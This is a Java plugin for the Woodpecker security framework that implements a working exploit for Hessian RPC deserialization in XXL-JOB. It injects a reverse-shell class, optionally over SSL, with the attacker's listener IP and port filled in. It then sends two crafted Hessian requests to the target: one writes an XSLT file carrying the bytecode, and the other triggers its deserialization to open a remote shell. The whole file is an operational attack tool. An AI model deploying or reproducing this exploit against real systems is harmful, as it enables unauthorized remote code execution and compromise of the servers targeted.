package plugins.vul.xxljob;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.requests.Header;
import me.gv7.woodpecker.requests.Requests;
import me.gv7.woodpecker.tools.misc.RandomUtil;
import util.ByteCodeFactory;
import util.ResourceUtil;

import java.io.ByteArrayInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Modifier;
import java.util.Arrays;
import java.util.Base64;
import java.util.Map;

public class Hessian_RPC_Deserialization_XSLT_ReverseShell_Exploit implements IExploit {
    private IPluginHelper helper;
    public Hessian_RPC_Deserialization_XSLT_ReverseShell_Exploit() {
        helper = Hessian_RPC_Deserialization_Plugin.pluginHelper;
    }

    @Override
    public String getExploitTabCaption() {
        return "XSLT利用链反弹SSL Shell";
    }

    @Override
    public IArgsUsageBinder getExploitCustomArgs() {
        IArg ipArg = helper.createArg();
        ipArg.setName("IP");
        ipArg.setType(IArg.ARG_TYPE_IP);
        ipArg.setRequired(true);
        ipArg.setDefaultValue("127.0.0.1");
        ipArg.setDescription("ncat监听IP");

        IArg portArg = helper.createArg();
        portArg.setType(IArg.ARG_TYPE_PORT);
        portArg.setName("PORT");
        portArg.setRequired(true);
        portArg.setDefaultValue("443");
        portArg.setDescription("ncat监听端口");

        IArg xsltPathArg = helper.createArg();
        xsltPathArg.setName("xslt-path");
        xsltPathArg.setRequired(true);
        xsltPathArg.setDefaultValue("local.xslt");
        xsltPathArg.setDescription("xslt落地的路径,可以是当前目录下也可以是类似/tmp/local.xslt等绝对路径");

        IArg sslArg = helper.createArg();
        sslArg.setName("ssl-enable");
        sslArg.setRequired(true);
        sslArg.setType(IArg.ARG_TYPE_BOOLEAN);
        sslArg.setDefaultValue("true");
        sslArg.setDescription("是否支持SSL");


        IArg hessianProtocolVersion = helper.createArg();
        hessianProtocolVersion.setName("version");
        hessianProtocolVersion.setRequired(true);
        hessianProtocolVersion.setDefaultValue("2");
        hessianProtocolVersion.setEnumValue(Arrays.asList("1","2"));
        hessianProtocolVersion.setDescription("hessian协议版本");

        IArgsUsageBinder usageBinder = helper.createArgsUsageBinder();
        usageBinder.setArgsList(Arrays.asList(ipArg,portArg,xsltPathArg,hessianProtocolVersion,sslArg));
        return usageBinder;
    }

    @Override
    public void doExploit(ITarget iTarget, Map<String, Object> map, IResultOutput iResultOutput) throws Throwable {
        int version = Integer.parseInt((String) map.get("version"));
        String ip = (String) map.get("IP");
        String port = (String) map.get("PORT");
        String xsltPath = (String) map.get("xslt-path");
        String sslEnable = (String) map.get("ssl-enable");

        String className = RandomUtil.getRandomString(8);
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = null;
        if (sslEnable.equals("true")){
            ctClass = classPool.makeClass(new ByteArrayInputStream(ResourceUtil.getResourceBytes("template/class/ReverseShellWithSSL.class")));
        } else {
            ctClass = classPool.makeClass(new ByteArrayInputStream(ResourceUtil.getResourceBytes("template/class/ReverseShell.class")));
        }

        ctClass.setName(className);

        CtField ipFiled = ctClass.getField("ip");
        CtField portField = ctClass.getField("port");

        ctClass.removeField(ipFiled);
        ctClass.removeField(portField);

        ipFiled = new CtField(classPool.get("java.lang.String"),"ip",ctClass);
        portField = new CtField(classPool.get("java.lang.String"),"port",ctClass);

        ipFiled.setModifiers(Modifier.PRIVATE|Modifier.STATIC);
        portField.setModifiers(Modifier.PRIVATE|Modifier.STATIC);
        ctClass.addField(ipFiled, CtField.Initializer.constant(ip));
        ctClass.addField(portField,CtField.Initializer.constant(port));
        ctClass.getClassFile().setMajorVersion(52);
        String byteCodes = Base64.getEncoder().encodeToString(ctClass.toBytecode());
        String xslt = ResourceUtil.getResourceString("template/other/local.xslt")
                .replace("{className}",className)
                .replace("{byteCodes}",byteCodes);
        FileOutputStream fos = new FileOutputStream(className+".class");
        fos.write(ctClass.toBytecode());

        byte[] serializeBytes = ByteCodeFactory.generateXSLTHessianSerializePayload(xsltPath,version);
        byte[] writeXsltBytes = ByteCodeFactory.generateWriteXSLTPayload(xsltPath,xslt.getBytes(),version);

        Requests.post(iTarget.getAddress())
                .headers(Header.of("Content-Type", "x-application/hessian"))
                .userAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101")
                .body(writeXsltBytes)
                .send();
        iResultOutput.infoPrintln("write xslt request send complete");

        Requests.post(iTarget.getAddress())
                .headers(Header.of("Content-Type", "x-application/hessian"))
                .userAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101")
                .body(serializeBytes)
                .send();
        iResultOutput.infoPrintln("serialize from xslt request send complete");
    }

}
